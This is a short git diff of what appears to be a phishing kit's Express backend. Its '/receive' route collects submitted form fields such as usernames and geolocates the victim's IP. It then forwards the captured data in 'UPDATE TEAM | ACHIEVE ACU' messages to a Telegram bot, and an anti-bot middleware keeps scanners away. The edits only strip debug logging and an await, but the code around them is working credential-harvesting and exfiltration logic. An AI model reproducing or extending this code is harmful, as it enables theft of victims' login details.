@@ -187,7 +187,6 @@ app.post('/receive', async (req, res) => {
     const sendAPIRequest = async (ipAddress) => {
       try {
         const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
-        console.log(apiResponse.data);
         return apiResponse.data;
       } catch (error) {
         console.error("Error in API request:", error);
@@ -201,7 +200,6 @@ app.post('/receive', async (req, res) => {
     const systemLang = req.headers["accept-language"];
 
     const myObjects = Object.keys(myObject).map(key => key.toLowerCase());
-    console.log(myObjects);
 
     if (myObjects.includes('username')) {
       message += `✅ UPDATE TEAM | ACHIEVE ACU | USER_${ipAddress}\n\n` +
@@ -322,8 +320,8 @@ app.post('/receive', async (req, res) => {
     }
 
     console.log(message); 
-    const sendMessage = sendMessageFor(botToken, chatId); 
-    await sendMessage(message);
+	  const sendMessage = sendMessageFor(botToken, chatId); 
+	  sendMessage(message);
 
   } catch (error) {
     console.error("Error in processing request:", error);
@@ -361,6 +359,6 @@ function antiBotMiddleware(req, res, next) {
   } else {
     next();
   }
-}
+} 
 
 app.use(antiBotMiddleware);
